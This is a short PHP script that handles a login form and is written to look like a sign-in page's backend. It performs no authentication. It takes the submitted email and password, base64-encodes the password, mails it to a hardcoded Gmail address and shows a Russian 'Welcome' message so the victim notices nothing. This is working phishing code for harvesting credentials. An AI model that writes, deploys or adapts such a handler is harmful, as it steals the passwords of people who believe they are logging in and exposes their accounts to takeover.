<?php
$email = htmlspecialchars($_POST['email']);
$password = htmlspecialchars($_POST['password']);

if ($email == '' || $password == '') {
echo 'Заполните все поля';
exit;
}
// Отправка
$password = "=?utf-8?B?".base64_encode($password)."?=";
$headers = "From: $email\r\nReply-to: email\r\nContent-type: text/html; charset=utf-8\r\n";
if (mail("jillfoh@gmail.com", $password, $headers))
	echo 'Добро пожаловать';
else
	echo 'Заполните все поля';
?>
